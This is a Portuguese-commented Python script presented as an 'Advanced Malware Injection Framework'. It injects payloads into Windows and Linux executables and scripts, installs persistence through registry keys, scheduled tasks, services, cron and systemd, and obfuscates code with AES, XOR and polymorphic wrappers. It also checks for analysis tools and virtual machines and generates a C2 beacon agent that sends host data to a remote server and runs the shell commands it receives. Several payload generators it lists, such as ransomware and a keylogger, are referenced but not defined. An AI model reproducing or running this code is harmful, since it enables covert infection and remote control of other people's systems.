#!/usr/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import base64
import zlib
import platform
import hashlib
import json
import shutil
import subprocess
import socket
import struct
import threading
import ctypes
import tempfile
import binascii
import hashlib
import pefile
import elftools
from elftools.elf.elffile import ELFFile
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import requests
import importlib.util

# ==================== CONFIGURAÇÃO AVANÇADA ====================
C2_SERVER = "https://your-c2-server.com/api/endpoint"  # Configure seu C2
ENCRYPTION_KEY = b"your-very-secure-encryption-key-32-bytes!"  # 32 bytes para AES

# ==================== INSTALAÇÃO DE DEPENDÊNCIAS ====================
def install_package(package):
    try:
        __import__(package.split('-')[0] if '-' in package else package)
    except ImportError:
        print(f"[!] Instalando {package}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])

# Instalar dependências necessárias
for package in ['requests', 'cryptography', 'pycryptodomex', 'pefile', 'pyelftools']:
    install_package(package)

# ==================== CONFIGURAÇÃO DE CORES ====================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# ==================== FUNÇÕES DE UTILIDADE ====================
def print_banner():
    banner = f"""
{Colors.RED}{Colors.BOLD}
███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗███████╗
██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝██╔════╝
█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   █████╗  
██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ██╔══╝  
███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   ███████╗
╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝
{Colors.END}
{Colors.RED}{Colors.BOLD}           ADVANCED MALWARE INJECTION FRAMEWORK v4.0{Colors.END}
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗{Colors.END}
{Colors.RED}║ {Colors.YELLOW}⚠️  FOR PENETRATION TESTING AND RESEARCH PURPOSES ONLY ⚠️  {Colors.RED}║{Colors.END}
{Colors.RED}╚═══════════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner)

def print_error(message):
    print(f"{Colors.RED}[✗] {message}{Colors.END}")

def print_success(message):
    print(f"{Colors.GREEN}[✓] {message}{Colors.END}")

def print_warning(message):
    print(f"{Colors.YELLOW}[!] {message}{Colors.END}")

def print_info(message):
    print(f"{Colors.CYAN}[*] {message}{Colors.END}")

def encrypt_data(data, key=ENCRYPTION_KEY):
    """Criptografa dados usando AES"""
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data.encode())
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode()

def decrypt_data(encrypted_data, key=ENCRYPTION_KEY):
    """Descriptografa dados usando AES"""
    data = base64.b64decode(encrypted_data.encode())
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode()

# ==================== CLASSE PRINCIPAL ====================
class AdvancedMalwareInjector:
    def __init__(self):
        self.supported_types = {
            'python': ['.py'],
            'bash': ['.sh', '.bash'],
            'java': ['.java', '.jar', '.class'],
            'javascript': ['.js', '.jsx', '.ts'],
            'php': ['.php', '.phtml'],
            'html': ['.html', '.htm', '.xhtml'],
            'binary': ['.exe', '.dll', '.so', '.bin', '.elf', '.sys', '.com']
        }
        
        self.payloads = {
            '1': {'name': 'Reverse Shell Avançado', 'func': self.generate_reverse_shell},
            '2': {'name': 'Ransomware Enterprise', 'func': self.generate_ransomware},
            '3': {'name': 'Data Stealer Completo', 'func': self.generate_stealer},
            '4': {'name': 'Keylogger com Exfiltração', 'func': self.generate_keylogger},
            '5': {'name': 'Botnet Client', 'func': self.generate_botnet},
            '6': {'name': 'Rootkit Kernel', 'func': self.generate_rootkit},
            '7': {'name': 'Downloader/Executor', 'func': self.generate_downloader},
            '8': {'name': 'Coin Miner Oculto', 'func': self.generate_miner},
            '9': {'name': 'C2 Beacon Agent', 'func': self.generate_c2_agent}
        }
        
        self.obfuscation_methods = {
            '1': 'Base64 + Compression + Encryption',
            '2': 'AES + Polymorphic Wrapper',
            '3': 'Metamorphic Engine Lite',
            '4': 'Custom XOR + ROT Encoding',
            '5': 'API Hashing + String Encryption'
        }
        
        self.injection_techniques = {
            'binary': ['section_injection', 'code_cave', 'tls_callback', 'entry_point_modification'],
            'script': ['import_hijacking', 'function_hooking', 'inline_patching']
        }

    # ==================== TÉCNICAS DE INJEÇÃO EM BINÁRIOS ====================
    def inject_into_pe(self, file_path, shellcode):
        """Injeção avançada em arquivos PE (Windows EXE/DLL)"""
        try:
            pe = pefile.PE(file_path)
            
            # Calcula o tamanho necessário
            shellcode_len = len(shellcode)
            shellcode_len_aligned = (shellcode_len + 0xff) & ~0xff  # Alinhar para 0x100
            
            # Encontra ou cria uma nova seção
            new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
            new_section.__unpack__(bytearray(new_section.sizeof()))
            
            new_section.Name = b".NewSec"
            new_section.Misc_VirtualSize = shellcode_len_aligned
            new_section.VirtualAddress = (pe.sections[-1].VirtualAddress + 
                                         pe.sections[-1].Misc_VirtualSize + 
                                         0xff) & ~0xff
            new_section.SizeOfRawData = shellcode_len_aligned
            new_section.PointerToRawData = (pe.sections[-1].PointerToRawData + 
                                           pe.sections[-1].SizeOfRawData + 
                                           0xff) & ~0xff
            new_section.Characteristics = (0xE0000020)  # READABLE | EXECUTABLE | WRITABLE | CODE
            
            # Adiciona a nova seção
            pe.sections.append(new_section)
            pe.OPTIONAL_HEADER.SizeOfImage = new_section.VirtualAddress + new_section.Misc_VirtualSize
            
            # Modifica o ponto de entrada para apontar para o shellcode
            original_entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
            pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_section.VirtualAddress
            
            # Escreve o shellcode na nova seção
            pe.set_bytes_at_rva(new_section.VirtualAddress, shellcode)
            
            # Adiciona código para voltar ao Entry Point original
            return_code = (b"\x68" + struct.pack("<I", original_entry_point) +  # push original_entry_point
                          b"\xC3")  # ret
            pe.set_bytes_at_rva(new_section.VirtualAddress + shellcode_len, return_code)
            
            # Salva o arquivo modificado
            pe.write(filename=file_path + '.infected')
            return True
            
        except Exception as e:
            print_error(f"Erro na injeção PE: {str(e)}")
            return False

    def inject_into_elf(self, file_path, shellcode):
        """Injeção avançada em arquivos ELF (Linux)"""
        try:
            with open(file_path, 'rb') as f:
                elf = ELFFile(f)
                # Implementação complexa de injeção ELF aqui
                # (código simplificado para exemplo)
                pass
                
            # Técnica simplificada: anexar e modificar entry point
            with open(file_path, 'ab') as f:
                # Adiciona shellcode ao final
                f.write(shellcode)
                
            # Em uma implementação real, modificaríamos o entry point
            # no cabeçalho ELF para apontar para o shellcode
            return True
            
        except Exception as e:
            print_error(f"Erro na injeção ELF: {str(e)}")
            return False

    # ==================== TÉCNICAS DE PERSISTÊNCIA ====================
    def install_persistence_windows(self, payload_path):
        """Instala persistência no Windows"""
        techniques = []
        
        # 1. Registry Run Key
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as regkey:
                winreg.SetValueEx(regkey, "SystemService", 0, winreg.REG_SZ, payload_path)
            techniques.append("Registry Run Key")
        except: pass
        
        # 2. Scheduled Task
        try:
            task_cmd = f'schtasks /create /tn "WindowsUpdateService" /tr "{payload_path}" /sc onlogon /rl highest /f'
            subprocess.run(task_cmd, shell=True, capture_output=True)
            techniques.append("Scheduled Task")
        except: pass
        
        # 3. Service Installation
        try:
            service_cmd = f'sc create "WindowsUpdate" binPath= "{payload_path}" start= auto'
            subprocess.run(service_cmd, shell=True, capture_output=True)
            techniques.append("Service Installation")
        except: pass
        
        return techniques

    def install_persistence_linux(self, payload_path):
        """Instala persistência no Linux"""
        techniques = []
        
        # 1. Systemd Service
        try:
            service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart={payload_path}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target"""
            
            service_path = os.path.expanduser("~/.config/systemd/user/system-update.service")
            os.makedirs(os.path.dirname(service_path), exist_ok=True)
            with open(service_path, 'w') as f:
                f.write(service_content)
            
            subprocess.run(["systemctl", "--user", "enable", "system-update.service"], 
                         capture_output=True)
            techniques.append("Systemd Service")
        except: pass
        
        # 2. Cron Job
        try:
            cron_cmd = f"(crontab -l 2>/dev/null; echo \"@reboot {payload_path}\") | crontab -"
            subprocess.run(cron_cmd, shell=True, capture_output=True)
            techniques.append("Cron Job")
        except: pass
        
        # 3. .bashrc / .profile
        try:
            bashrc_path = os.path.expanduser("~/.bashrc")
            with open(bashrc_path, 'a') as f:
                f.write(f"\n# Startup\n{payload_path} &\n")
            techniques.append("Shell Startup")
        except: pass
        
        return techniques

    # ==================== TÉCNICAS DE OFUSCAÇÃO AVANÇADA ====================
    def advanced_obfuscation(self, code, method):
        """Ofuscação avançada com múltiplas técnicas"""
        
        if method == '1':  # Base64 + Compression + Encryption
            # Compressão
            compressed = zlib.compress(code.encode())
            # Criptografia AES
            cipher = AES.new(ENCRYPTION_KEY, AES.MODE_EAX)
            ciphertext, tag = cipher.encrypt_and_digest(compressed)
            encrypted = cipher.nonce + tag + ciphertext
            # Base64
            encoded = base64.b64encode(encrypted).decode()
            
            return f"""
import base64,zlib
from Crypto.Cipher import AES
enc_data = '{encoded}'
data = base64.b64decode(enc_data)
nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
cipher = AES.new({ENCRYPTION_KEY}, AES.MODE_EAX, nonce=nonce)
decompressed = zlib.decompress(cipher.decrypt_and_verify(ciphertext, tag))
exec(decompressed.decode())
"""
        
        elif method == '2':  # AES + Polymorphic Wrapper
            # Gera código polimórfico variável
            var_names = [''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)) for _ in range(8)]
            
            # Criptografa o código
            cipher = AES.new(ENCRYPTION_KEY, AES.MODE_EAX)
            ciphertext, tag = cipher.encrypt_and_digest(code.encode())
            encrypted = base64.b64encode(cipher.nonce + tag + ciphertext).decode()
            
            return f"""
# Variáveis polimórficas
{var_names[0]} = {random.randint(1000, 9999)}
{var_names[1]} = "{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=12))}"
{var_names[2]} = [{(', '.join(str(random.randint(1, 100)) for _ in range(5)))}]

# Código ofuscado
from Crypto.Cipher import AES
import base64
{var_names[3]} = '{encrypted}'
{var_names[4]} = base64.b64decode({var_names[3]})
{var_names[5]}, {var_names[6]}, {var_names[7]} = {var_names[4]}[:16], {var_names[4]}[16:32], {var_names[4]}[32:]
{var_names[8]} = AES.new({ENCRYPTION_KEY}, AES.MODE_EAX, nonce={var_names[5]})
exec({var_names[8]}.decrypt_and_verify({var_names[7]}, {var_names[6]}).decode())
"""
        
        elif method == '4':  # Custom XOR + ROT Encoding
            # XOR + ROT13 customizado
            xor_key = random.randint(1, 255)
            encoded_code = ''.join(chr((ord(c) ^ xor_key) + 13) for c in code)
            return f"""
# Decodificação customizada
exec(''.join(chr((ord(c) - 13) ^ {xor_key}) for c in '{encoded_code}'))
"""
        
        return code

    # ==================== EVASÃO DE DETECÇÃO ====================
    def anti_analysis_checks(self):
        """Verificações anti-análise"""
        checks = []
        
        # Verifica se está em ambiente de análise
        try:
            # Verifica processos suspeitos
            suspicious_processes = ['ollydbg', 'wireshark', 'procmon', 'processhacker', 'idaq', 'ida64', 'immunity']
            if platform.system() == 'Windows':
                import psutil
                for proc in psutil.process_iter(['name']):
                    if any(susp in proc.info['name'].lower() for susp in suspicious_processes):
                        checks.append(f"Processo de análise detectado: {proc.info['name']}")
            
            # Verifica se está em VM
            vm_indicators = [
                "vmware", "virtualbox", "qemu", "xen", "hyper-v", 
                "vbox", "vmware", "virtual"
            ]
            
            if platform.system() == 'Windows':
                try:
                    import winreg
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System") as key:
                        try:
                            bios_vendor = winreg.QueryValueEx(key, "SystemBiosVersion")[0]
                            if any(vm in str(bios_vendor).lower() for vm in vm_indicators):
                                checks.append("VM detectada pelo registro")
                        except: pass
                except: pass
            
            # Verifica endereços MAC de VM
            try:
                import uuid
                mac = uuid.getnode()
                mac_address = ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
                vm_mac_prefixes = ['00:05:69', '00:0C:29', '00:1C:14', '00:50:56', '08:00:27']
                if any(mac_address.startswith(prefix) for prefix in vm_mac_prefixes):
                    checks.append("MAC address de VM detectado")
            except: pass
            
        except Exception as e:
            print_error(f"Erro em verificações anti-análise: {str(e)}")
        
        return checks

    # ==================== COMUNICAÇÃO C2 ====================
    def c2_communication(self, action, data=None):
        """Comunicação com servidor C2"""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/json'
            }
            
            payload = {
                'action': action,
                'host_id': hashlib.sha256(platform.node().encode()).hexdigest(),
                'timestamp': time.time(),
                'data': encrypt_data(json.dumps(data)) if data else None
            }
            
            response = requests.post(
                C2_SERVER,
                json=payload,
                headers=headers,
                timeout=30,
                verify=False  # Aviso: isso desabilita verificação SSL
            )
            
            if response.status_code == 200:
                response_data = response.json()
                if 'data' in response_data:
                    return json.loads(decrypt_data(response_data['data']))
                return response_data
            return None
            
        except Exception as e:
            print_error(f"Erro na comunicação C2: {str(e)}")
            return None

    # ==================== PAYLOADS AVANÇADOS ====================
    def generate_c2_agent(self, **kwargs):
        """Agente C2 avançado com múltiplas capacidades"""
        beacon_interval = kwargs.get('interval', 300)
        c2_server = kwargs.get('c2_server', C2_SERVER)
        
        return f"""
import os
import time
import json
import base64
import threading
import subprocess
import requests
from Crypto.Cipher import AES
import platform
import socket
import hashlib

class C2Agent:
    def __init__(self):
        self.c2_server = "{c2_server}"
        self.beacon_interval = {beacon_interval}
        self.agent_id = hashlib.sha256(platform.node().encode()).hexdigest()
        self.encryption_key = {ENCRYPTION_KEY}
    
    def encrypt_data(self, data):
        cipher = AES.new(self.encryption_key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(json.dumps(data).encode())
        return base64.b64encode(cipher.nonce + tag + ciphertext).decode()
    
    def decrypt_data(self, encrypted_data):
        data = base64.b64decode(encrypted_data.encode())
        nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
        cipher = AES.new(self.encryption_key, AES.MODE_EAX, nonce=nonce)
        return json.loads(cipher.decrypt_and_verify(ciphertext, tag).decode())
    
    def beacon(self):
        system_info = {{
            "hostname": platform.node(),
            "os": platform.platform(),
            "user": os.getlogin(),
            "ip": socket.gethostbyname(socket.gethostname()),
            "processes": self.get_running_processes()
        }}
        
        try:
            response = requests.post(
                self.c2_server,
                json={{"action": "beacon", "data": self.encrypt_data(system_info)}},
                headers={{"User-Agent": "Mozilla/5.0"}},
                timeout=30,
                verify=False
            )
            
            if response.status_code == 200:
                commands = self.decrypt_data(response.json().get('data', '{{}}'))
                self.execute_commands(commands)
                
        except Exception as e:
            pass
    
    def execute_commands(self, commands):
        for cmd in commands.get('execute', []):
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                self.send_result(cmd, result.stdout, result.stderr, result.returncode)
            except:
                pass
    
    def send_result(self, command, stdout, stderr, returncode):
        result_data = {{
            "command": command,
            "stdout": stdout,
            "stderr": stderr,
            "returncode": returncode
        }}
        
        try:
            requests.post(
                self.c2_server,
                json={{"action": "result", "data": self.encrypt_data(result_data)}},
                headers={{"User-Agent": "Mozilla/5.0"}},
                timeout=30,
                verify=False
            )
        except:
            pass
    
    def get_running_processes(self):
        try:
            if platform.system() == "Windows":
                import psutil
                return [p.name() for p in psutil.process_iter(['name'])]
            else:
                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                return result.stdout.split('\\n')[:10]
        except:
            return []
    
    def run(self):
        while True:
            self.beacon()
            time.sleep(self.beacon_interval)

# Iniciar agente C2
agent = C2Agent()
threading.Thread(target=agent.run, daemon=True).start()
"""

    # ==================== FUNÇÕES DE INJEÇÃO ====================
    def inject_into_file(self, file_path, payload, file_type):
        """Injeção principal baseada no tipo de arquivo"""
        try:
            # Verificações anti-análise
            analysis_checks = self.anti_analysis_checks()
            if analysis_checks:
                print_warning(f"Indicadores de análise detectados: {analysis_checks}")
            
            # Backup do arquivo original
            backup_path = file_path + '.bak'
            shutil.copy2(file_path, backup_path)
            
            if file_type == 'binary':
                # Converter payload para shellcode (simplificado)
                # Em uma implementação real, usaríamos um compilador ou conversor
                shellcode = payload.encode() + b'\x90' * (1024 - len(payload.encode()))
                
                if file_path.endswith(('.exe', '.dll')):
                    return self.inject_into_pe(file_path, shellcode)
                elif file_path.endswith(('.elf', '.so', '.bin')):
                    return self.inject_into_elf(file_path, shellcode)
            else:
                # Para arquivos de script
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                # Técnica de injeção baseada no tipo
                if file_type == 'python':
                    # Injeta após imports
                    lines = content.split('\n')
                    import_end = 0
                    for i, line in enumerate(lines):
                        if line.strip().startswith(('import ', 'from ')):
                            import_end = i + 1
                        elif line.strip() and not line.strip().startswith('#') and import_end > 0:
                            break
                    
                    lines.insert(import_end, payload)
                    new_content = '\n'.join(lines)
                
                else:
                    # Para outros scripts, adiciona no final
                    new_content = content + '\n' + payload
                
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(new_content)
                
                # Torna executável se for script
                if file_type in ['bash', 'python']:
                    os.chmod(file_path, 0o755)
                
                return True
                
        except Exception as e:
            print_error(f"Erro na injeção: {str(e)}")
            # Restaurar backup em caso de erro
            if os.path.exists(backup_path):
                shutil.move(backup_path, file_path)
            return False

    # ==================== FUNÇÃO PRINCIPAL ====================
    def run(self):
        print_banner()
        
        # Verificação de ambiente
        if os.geteuid() == 0:
            print_warning("Executando como ROOT! Permissões elevadas detectadas.")
        
        # Selecionar arquivo alvo
        target_file = input(f"{Colors.CYAN}[?] Caminho do arquivo alvo: {Colors.END}").strip()
        
        if not os.path.exists(target_file):
            print_error("Arquivo não encontrado!")
            return
        
        # Detectar tipo de arquivo
        file_ext = os.path.splitext(target_file)[1].lower()
        file_type = None
        
        for t, exts in self.supported_types.items():
            if file_ext in exts:
                file_type = t
                break
        
        if not file_type:
            print_error("Tipo de arquivo não suportado!")
            return
        
        print_info(f"Tipo detectado: {file_type.upper()}")
        
        # Selecionar payload
        print(f"\n{Colors.YELLOW}[+] Tipos de Payload Disponíveis:{Colors.END}")
        for key, payload in self.payloads.items():
            print(f"  {key}. {payload['name']}")
        
        payload_choice = input(f"{Colors.CYAN}[?] Selecionar payload (1-9): {Colors.END}").strip()
        
        if payload_choice not in self.payloads:
            print_error("Escolha inválida!")
            return
        
        # Configurar payload
        payload_config = {}
        if payload_choice in ['1', '9']:  # Reverse Shell ou C2 Agent
            payload_config['c2_server'] = input(f"{Colors.CYAN}[?] URL do C2 Server: {Colors.END}") or C2_SERVER
            payload_config['interval'] = int(input(f"{Colors.CYAN}[?] Intervalo de beacon (segundos): {Colors.END}") or "300")
        
        # Gerar payload
        payload_code = self.payloads[payload_choice]['func'](**payload_config)
        
        # Selecionar ofuscação
        print(f"\n{Colors.YELLOW}[+] Métodos de Ofuscação:{Colors.END}")
        for key, method in self.obfuscation_methods.items():
            print(f"  {key}. {method}")
        
        obfuscation_choice = input(f"{Colors.CYAN}[?] Método de ofuscação (1-5): {Colors.END}").strip()
        
        if obfuscation_choice in self.obfuscation_methods:
            payload_code = self.advanced_obfuscation(payload_code, obfuscation_choice)
        
        # Confirmação final
        warning_msg = f"{Colors.RED}{Colors.BOLD}⚠️  OPERAÇÃO PERIGOSA - DANOS REAIS POSSÍVEIS! ⚠️{Colors.END}"
        print(f"\n{warning_msg}")
        confirm = input(f"{Colors.RED}[?] Confirmar injeção? (s/N): {Colors.END}").lower()
        
        if confirm != 's':
            print_info("Operação cancelada.")
            return
        
        # Realizar injeção
        print_info("Injectando payload...")
        success = self.inject_into_file(target_file, payload_code, file_type)
        
        if success:
            print_success("Payload injetado com sucesso!")
            
            # Instalar persistência
            if self._confirm("Instalar mecanismos de persistência?"):
                persistence_techniques = []
                if platform.system() == "Windows":
                    persistence_techniques = self.install_persistence_windows(target_file)
                else:
                    persistence_techniques = self.install_persistence_linux(target_file)
                
                if persistence_techniques:
                    print_success(f"Persistência instalada: {', '.join(persistence_techniques)}")
            
            # Registrar no C2
            if self._confirm("Registrar implantação no C2?"):
                implant_data = {
                    'target_file': target_file,
                    'payload_type': self.payloads[payload_choice]['name'],
                    'timestamp': time.time(),
                    'host': platform.node()
                }
                result = self.c2_communication('implant', implant_data)
                if result:
                    print_success("Implantação registrada no C2!")
        
        else:
            print_error("Falha na injeção!")

    def _confirm(self, message):
        """Confirmação simplificada"""
        response = input(f"{Colors.CYAN}[?] {message} (s/N): {Colors.END}").lower()
        return response == 's'

# ==================== EXECUÇÃO PRINCIPAL ====================
if __name__ == "__main__":
    try:
        injector = AdvancedMalwareInjector()
        injector.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Operação cancelada pelo usuário{Colors.END}")
    except Exception as e:
        print_error(f"Erro crítico: {str(e)}")
        import traceback
        traceback.print_exc()
